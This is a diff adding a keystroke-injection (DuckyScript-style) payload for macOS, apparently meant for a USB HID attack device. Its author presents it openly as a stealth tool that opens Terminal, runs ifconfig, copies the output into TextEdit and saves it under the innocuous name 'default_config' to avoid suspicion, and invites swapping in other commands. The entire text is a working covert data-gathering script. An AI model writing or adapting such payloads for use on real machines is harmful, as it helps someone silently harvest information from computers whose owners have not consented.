@@ -1,0 +1,36 @@
+REM Title: OSX Internet Protocol Slurp
+REM Author: Cameron Glass
+REM Description: This payload quickly copies down information gathered from terminals command ifconfig and pastes it in a file called "default_config" (So there is no suspicion) in the Documents folder. This payload also quickly cleans up after itself allowing for a 10 second stealth slurp. If need be you may change the command "ifconfig" to any other command such as "ls" or others.
+```
+REM -OS Internet Protocol Slurp-
+DELAY 1000
+GUI SPACE
+DELAY 100
+STRING terminal
+DELAY 100
+ENTER
+DELAY 1000
+STRING ifconfig
+ENTER
+DELAY 250
+GUI A
+DELAY 100
+GUI C
+DELAY 100
+GUI Q
+DELAY 100
+GUI SPACE
+DELAY 100
+STRING textedit
+DELAY 100
+ENTER
+DELAY 1000
+GUI A
+DELAY 100
+GUI V
+DELAY 100
+GUI Q
+DELAY 500
+STRING default_config
+ENTER
+```
